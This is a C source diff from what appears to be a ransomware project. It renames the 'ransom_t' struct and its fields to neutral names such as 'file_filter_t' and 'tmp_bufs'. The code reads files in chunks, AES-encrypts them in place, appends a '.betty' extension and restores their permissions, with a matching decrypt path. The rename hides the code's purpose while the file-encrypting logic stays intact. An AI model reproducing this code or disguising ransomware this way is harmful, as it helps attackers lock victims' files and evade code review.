@@ -6,14 +6,14 @@
   * @fxn: pointer to function to enact on char buffer
   * Return: number of bytes read
  **/
-size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *))
+size_t read_file(const char *filepath, file_filter_t *file_filter, char *(*fxn)(char *, file_filter_t *))
 {
-	size_t bytes_read = ransom->target_file_buf->bytes_read;
-	off_t file_offset = ransom->target_file_buf->file_offset;
-	unsigned int st_size = (unsigned int)ransom->target_file_buf->file_info.st_size;
+	size_t bytes_read = file_filter->tmp_bufs->bytes_read;
+	off_t file_offset = file_filter->tmp_bufs->file_offset;
+	unsigned int st_size = (unsigned int)file_filter->tmp_bufs->file_info.st_size;
 	FILE *fd = NULL;
 
-	if (!filepath || !ransom)
+	if (!filepath || !file_filter)
 		return(0);
 	if(st_size == 0)
 	{
@@ -28,7 +28,7 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 		return(0);
 #ifndef NO_DEBUG
 	printf("\n\n----------------------------------------------\n");
-	printf("st_size: %d - file_offset: %d == %d\n", st_size, (int)ransom->target_file_buf->file_offset, st_size - (int)ransom->target_file_buf->file_offset);
+	printf("st_size: %d - file_offset: %d == %d\n", st_size, (int)file_filter->tmp_bufs->file_offset, st_size - (int)file_filter->tmp_bufs->file_offset);
 	printf("bytes_read: %d\n", (int)bytes_read);
 	getchar();
 #endif
@@ -36,18 +36,18 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 		bytes_read = BIGBUF;
 	else
 		bytes_read = (size_t)st_size - file_offset;
-	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
+	fread((char *)file_filter->tmp_bufs->buf, bytes_read, sizeof(char), fd);
 	fclose(fd);
 	/* update tmp buffer struct to use in main. Set end of bytes read to null, for printing later*/
 #ifndef NO_DEBUG
-	ransom->target_file_buf->buf[bytes_read] = '\0';
+	file_filter->tmp_bufs->buf[bytes_read] = '\0';
 #endif
-	ransom->target_file_buf->file_offset += bytes_read;
-	ransom->target_file_buf->bytes_read = bytes_read;
+	file_filter->tmp_bufs->file_offset += bytes_read;
+	file_filter->tmp_bufs->bytes_read = bytes_read;
 
 	/* call external function */
 	if(fxn)
-		fxn(ransom->target_file_buf->buf, ransom);
+		fxn(file_filter->tmp_bufs->buf, file_filter);
 	return (bytes_read);
 }
 
@@ -57,7 +57,7 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
   * @buffer: buffer to write into the file
   * Return: number of bytes read
  **/
-char *write_file(char *buffer, ransom_t *ransom)
+char *write_file(char *buffer, file_filter_t *file_filter)
 {
 	int buf_size = 0;
 	size_t new_ext_len = 0, filepath_len = 0, bytes_written = 0;
@@ -65,12 +65,12 @@ char *write_file(char *buffer, ransom_t *ransom)
 	unsigned char *cipher_buf = NULL;
 	FILE *fd = NULL;
 
-	filepath = ransom->target_file_buf->filepath;
+	filepath = file_filter->tmp_bufs->filepath;
 	filepath_len = my_strlen(filepath);
 	new_ext_len = my_strlen(new_ext);
-	buf_size = ransom->target_file_buf->bytes_read;
+	buf_size = file_filter->tmp_bufs->bytes_read;
 	/** ENCRYPT **/
-	if (ransom->cipher_flag == 'e')
+	if (file_filter->cipher_flag == 'e')
 	{
 		/**
 		  * If filepath has ".betty" at the end of it,
@@ -83,21 +83,21 @@ char *write_file(char *buffer, ransom_t *ransom)
 			my_strncat(filepath, new_ext, filepath_len, new_ext_len);
 
 		if ((fd = fopen(filepath, "ab+")))
-			fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
+			fseek(fd, file_filter->tmp_bufs->file_offset, SEEK_SET);
 		else
 			return(NULL);
-		cipher_buf = aes_encrypt(ransom->target_file_buf->cipher, (unsigned char *)buffer, &buf_size);
+		cipher_buf = aes_encrypt(file_filter->tmp_bufs->cipher, (unsigned char *)buffer, &buf_size);
 	}
 	/** DECRYPT **/
-	else if (ransom->cipher_flag == 'd')
+	else if (file_filter->cipher_flag == 'd')
 	{
 		if (find_substr_end(filepath, new_ext) != 0)
 			filepath[filepath_len - new_ext_len] = '\0';
 		if ((fd = fopen(filepath, "ab+")))
-			fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
+			fseek(fd, file_filter->tmp_bufs->file_offset, SEEK_SET);
 		else
 			return(NULL);
-		cipher_buf = aes_decrypt(ransom->target_file_buf->cipher, (unsigned char *)buffer, &buf_size);
+		cipher_buf = aes_decrypt(file_filter->tmp_bufs->cipher, (unsigned char *)buffer, &buf_size);
 	}
 	if ((bytes_written = fwrite(cipher_buf, buf_size, sizeof(char), fd)) < 1)
 	{
@@ -107,6 +107,6 @@ char *write_file(char *buffer, ransom_t *ransom)
 	}
 	free(cipher_buf);
 	fclose(fd);
-	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
+	chmod(filepath, file_filter->tmp_bufs->file_info.st_mode);
 	return(buffer);
 }
